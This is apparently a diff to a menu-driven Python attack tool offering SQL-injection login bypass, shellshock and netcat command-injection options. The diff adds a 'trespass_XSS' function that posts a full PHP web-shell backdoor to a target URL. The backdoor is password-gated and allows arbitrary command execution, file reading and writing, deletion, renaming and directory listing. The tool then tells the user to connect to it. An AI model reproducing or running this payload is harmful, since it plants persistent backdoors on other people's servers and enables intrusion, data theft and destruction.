@@ -22,7 +22,8 @@ mainmenu='''choices:
 	[3]typical_shellshock(blind)
 	[4]netcat_shellshock
 	[5]typical_command_injection(blind)
-	[6]netcat_command_injection\n'''
+	[6]netcat_command_injection
+	[7]trespass_XSS\n'''
 print(mainmenu)
 
 #define SQLI_bypass_login_forms
@@ -168,6 +169,20 @@ def	netcat_command_injection():
 			
 	#display message
 	print "to see if a reverse shell has opened listen with netcat"
+
+#define trespass_XSS	
+def trespass_XSS():
+
+	#take inputs
+	passwd=raw_input("password: ")
+	URL=raw_input("URL: ")
+	parameter=raw_input("parameter: ")
+	
+	#exploit
+	requests.post(URL, data={parameter:"<?php$pass = $_POST["pass"];if ($pass == \"" + passwd + "\"){$hostdata = $_POST['hostdata'];if ($hostdata==\"get\"){echo php_uname();}$file = $_POST[\"filename\"];$command = $_POST['command'];echo exec($command);$content = $_POST[\"content\"];file_put_contents($file, $content);$addtofile = $_POST[\"addtofile\"];$addcontent = file_get_contents($addtofile);$addcontent .= $_POST[\"addcontent\"];file_put_contents($addtofile, $addcontent);$view = $_POST[\"view\"];echo file_get_contents($view);$mkdir = $_POST[\"mkdir\"];mkdir($mkdir);$rmdir = $_POST[\"rmdir\"];rmdir($rmdir);$oldname =  $_POST[\"oldname\"];$newname =  $_POST[\"newname\"];rename($oldname, $newname);$delete = $_POST[\"delete\"];unlink($delete);$iwantls = $_POST['iwantls'];if($iwantls == \"true\"){$ls = $_POST['ls'];$dir = opendir($ls);$item = readdir($dir);while(($item = readdir($dir)) !== FALSE){echo ' ';echo $item;}}}else{echo \"nope\";}?>"})
+
+	#display message
+	print("if the attack worked you should be able to connect to a trespass backdoor on the page in the URL you provided. ")
 	
 #select from mainmenu
 while True:
@@ -188,3 +203,5 @@ while True:
 		typical_command_injection()	
 	elif option == "6" or option == "netcat_from_command_injection":
 		netcat_command_injection()
+	elif option == "7" or option == "trespass_XSS":
+		trespass_XSS()
